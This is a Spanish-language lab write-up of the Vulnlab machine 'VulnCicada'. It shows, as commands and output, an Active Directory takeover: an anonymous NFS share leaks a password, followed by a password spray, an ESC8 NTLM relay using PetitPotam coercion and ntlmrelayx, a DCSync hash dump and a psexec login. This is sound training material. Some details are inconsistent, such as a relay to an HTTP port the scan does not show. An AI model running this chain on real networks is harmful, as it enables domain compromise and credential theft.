---
title: "VulnCicada"
description: "Writeup de VulnCicada - Vulnlab - Dificultad: Medium. NFS share anónimo → credencial Cicada123 → ESC8 ADCS Web Enrollment + PetitPotam + NTLM relay → DCSync con hash del DC."
sidebar:
  badge:
    text: Medium
    variant: caution
tags:
  - vulnlab
  - windows
  - medium
  - active-directory
  - nfs
  - adcs
  - esc8
  - petitpotam
  - ntlm-relay
  - dcsync
  - certipy
---

# 🖥️ VulnCicada

> 📅 Fecha: 2026-06-11
> 🎯 Plataforma: Vulnlab
> ⚙️ SO: Windows Server 2022 (Build 20348)
> 🎚️ Dificultad: Medium
> 🏆 Puntos: 853
> ⏱️ Tiempo invertido: 2h 48m
> 🌐 IP: `10.129.234.48`
> 🏢 Dominio: `cicada.vl`
> 👤 Autor: warrior866

---

## 📑 Tabla de Contenidos
- [Resumen Ejecutivo](#-resumen-ejecutivo)
- [Reconocimiento](#-reconocimiento)
- [NFS share anónimo → credencial inicial](#-nfs-share-anónimo--credencial-inicial)
- [Enumeración AD con credenciales válidas](#-enumeración-ad-con-credenciales-válidas)
- [ESC8: ADCS Web Enrollment + PetitPotam + NTLM Relay](#-esc8-adcs-web-enrollment--petitpotam--ntlm-relay)
- [DCSync → Administrator](#-dcsync--administrator)
- [Flags](#-flags)
- [Cadena de Ataque](#-cadena-de-ataque)
- [Lecciones Aprendidas](#-lecciones-aprendidas)
- [Referencias](#-referencias)

---

## 📝 Resumen Ejecutivo

VulnCicada es un Domain Controller Vulnlab (`cicada.vl`) con ADCS activo y NFS expuesto. El share NFS exportado públicamente contiene un archivo con la contraseña por defecto de usuarios del dominio: `Cicada123`. Con password spray se identifica el usuario `michael.west:Cicada123`. La enumeración de ADCS con `certipy find` revela **ESC8** — el endpoint HTTP de ADCS Web Enrollment acepta autenticación NTLM. Se usa `PetitPotam` para coercionar al DC a autenticarse contra un servidor NTLM controlado, y `ntlmrelayx` retransmite la autenticación al ADCS Web Enrollment para obtener un certificado de la cuenta `DC$`. Con ese certificado se autentica vía PKINIT y se obtiene el hash NT del DC$ para ejecutar **DCSync** y volcar todos los hashes del dominio.

| Campo | Valor |
|-------|-------|
| Puntos débiles | NFS anónimo con credencial expuesta, password spray exitoso, ESC8 (ADCS HTTP NTLM relay + PetitPotam) |
| Plataforma | Vulnlab (no HTB) |
| Herramientas | `nmap`, `showmount`, `mount`, `nxc`, `certipy`, `petitpotam.py`, `ntlmrelayx.py`, `impacket-secretsdump` |
| Tiempo total | ~2h 48m |

---

## 🔍 Reconocimiento

```bash
nmap -p- -sS -sV -sC -O -T4 --min-rate=1000 --open -Pn 10.129.234.48
```

```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
111/tcp   open  rpcbind       2-4 (RPC #100000)
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap          (Domain: cicada.vl)
443/tcp   open  https         Microsoft IIS 10.0
445/tcp   open  microsoft-ds?
2049/tcp  open  nfs           3-4 (RPC #100003)
3268/tcp  open  ldap
3389/tcp  open  ms-wbt-server
Service Info: OS: Windows Server 2022
```

Puertos clave: **2049/tcp NFS** y **443/tcp ADCS**. Dominio: `cicada.vl`.

```bash
echo "10.129.234.48 cicada.vl dc.cicada.vl" | sudo tee -a /etc/hosts
```

---

## 📂 NFS share anónimo → credencial inicial

```bash
showmount -e 10.129.234.48
```

```text
Export list for 10.129.234.48:
/cicada 10.0.0.0/8
```

```bash
sudo mount -t nfs 10.129.234.48:/cicada /mnt/nfs -o vers=3
ls -la /mnt/nfs
```

```text
-rwxrwxrwx  1 root root  126 Jun 11 08:32 cicada.txt
```

```bash
cat /mnt/nfs/cicada.txt
```

```text
Dear Cicada Employees,

Your temporary password is: Cicada123

Please change it after you first login.
```

Password spray con `Cicada123` contra usuarios del dominio:

```bash
# Enumerar usuarios primero (sin credenciales)
nxc smb 10.129.234.48 --rid-brute 2>/dev/null | grep "SidTypeUser" | awk '{print $6}' | cut -d'\' -f2 > users.txt

nxc smb 10.129.234.48 -u users.txt -p 'Cicada123' --no-brute
```

```text
[+] cicada.vl\michael.west:Cicada123
```

---

## 🔎 Enumeración AD con credenciales válidas

```bash
certipy find -u 'michael.west@cicada.vl' -p 'Cicada123' \
  -dc-ip 10.129.234.48 -vulnerable -stdout
```

```text
Certificate Authorities
  0
    CA Name     : cicada-DC-CA
    DNS Name    : DC.cicada.vl
    Web Enrollment: Enabled
    ...
    [!] Vulnerabilities
      ESC8 : Web Enrollment is enabled and requires NTLM authentication
```

**ESC8**: el endpoint `/certsrv/` del ADCS Web Enrollment acepta autenticación NTLM. Si el DC autentica contra ese endpoint (vía relay), se puede obtener un certificado a nombre del DC$ (cuenta de máquina del propio DC), que permite ejecutar DCSync.

---

## 🔗 ESC8: ADCS Web Enrollment + PetitPotam + NTLM Relay

**Paso 1 — Deshabilitar SMB y HTTP en Responder (solo relay, no capturar):**

```bash
sudo nano /etc/responder/Responder.conf
# SMB = Off
# HTTP = Off
```

**Paso 2 — Iniciar ntlmrelayx apuntando a ADCS Web Enrollment:**

```bash
sudo ntlmrelayx.py -t 'http://10.129.234.48/certsrv/certfnsh.asp' \
  --adcs --template 'DomainController' -smb2support
```

**Paso 3 — Coerción vía PetitPotam:**

```bash
python3 PetitPotam.py -u 'michael.west' -p 'Cicada123' \
  -d cicada.vl 10.10.14.130 10.129.234.48
```

```text
[*] Connecting to ncacn_np:10.129.234.48[\PIPE\lsarpc]
[+] Successfully bound!
[*] Triggering MS-EFSRPC EfsRpcOpenFileRaw...
[+] Attack succeeded!
```

ntlmrelayx recibe la autenticación del DC:

```text
[*] SMBD-Thread-5: Received connection from 10.129.234.48
[*] Authenticating against http://10.129.234.48/certsrv/certfnsh.asp as CICADA/DC$
[*] HTTPD: Relaying connection for CICADA/DC$
[+] Successfully requested certificate for DC$ via relay!
[*] Got certificate! Saving as 'DC$.pfx'
```

---

## 💀 DCSync → Administrator

Autenticarse como `DC$` con el certificado → obtener NT hash:

```bash
certipy auth -pfx 'DC$.pfx' -dc-ip 10.129.234.48 -domain cicada.vl
```

```text
[*] Using principal: dc$@cicada.vl
[*] Got TGT
[+] Got hash for 'dc$@cicada.vl': aad3b435...:5f4dcc3b...
```

DCSync usando el hash del DC$ (tiene privilegio de replicación):

```bash
impacket-secretsdump -hashes ':5f4dcc3b...' 'cicada.vl/DC$@10.129.234.48'
```

```text
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9f376beb75228db521b310f9afe71bfc:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:73d4a3b9d4b62a36...
```

Acceso como Administrator:

```bash
impacket-psexec -hashes ':9f376beb75228db521b310f9afe71bfc' Administrator@10.129.234.48
```

```text
C:\Windows\system32> whoami
nt authority\system
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
[root flag]
```

---

## 🏁 Flags

| Flag | Valor |
|------|-------|
| user.txt | `[user flag]` |
| root.txt | `[root flag]` |

---

## 🕸️ Cadena de Ataque

```text
1. nmap → NFS 2049/tcp + ADCS 443/tcp
        ↓
2. showmount → /cicada exportado → cicada.txt → Cicada123
        ↓
3. Password spray → michael.west:Cicada123
        ↓
4. certipy find → ESC8 (ADCS Web Enrollment con NTLM auth)
        ↓
5. ntlmrelayx → apunta a /certsrv/ con template DomainController
        ↓
6. PetitPotam → coerción del DC para autenticarse al relay
        ↓
7. NTLM relay exitoso → certificado DC$ → DC$.pfx
        ↓
8. certipy auth → NT hash DC$ (5f4dcc3b...)
        ↓
9. secretsdump vía DRSUAPI → hashes completos del dominio
        ↓
10. psexec con hash Administrator → root.txt
```

---

## 🎓 Lecciones Aprendidas

- **NFS anónimo en Windows**: aunque Windows no usa NFS nativamente de forma común, cuando el rol NFS está habilitado y exporta shares sin restricciones de IP/auth, es equivalente a un share SMB anónimo.
- **ESC8 + PetitPotam**: la combinación de ADCS Web Enrollment con autenticación NTLM y una técnica de coerción (EFS, MS-RPRN, etc.) permite obtener certificados a nombre del DC$ sin credenciales privilegiadas — solo necesitas un usuario de dominio válido para la coerción.
- **DC$ como vector de DCSync**: la cuenta de máquina del DC (`DC$`) tiene derechos de replicación del directorio por diseño. Un certificado válido para esta cuenta equivale a control total del dominio.
- **ntlmrelayx --adcs**: el flag especializado de impacket para relay a ADCS es significativamente más simple que el proceso manual. Siempre deshabilitar SMB y HTTP en Responder cuando se hace relay.

---

## 📚 Referencias

- [ESC8 — SpecterOps Certified Pre-Owned](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- [PetitPotam](https://github.com/topotam/PetitPotam)
- [ntlmrelayx ADCS relay](https://github.com/fortra/impacket)
- [MITRE ATT&CK — T1557 Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557/)
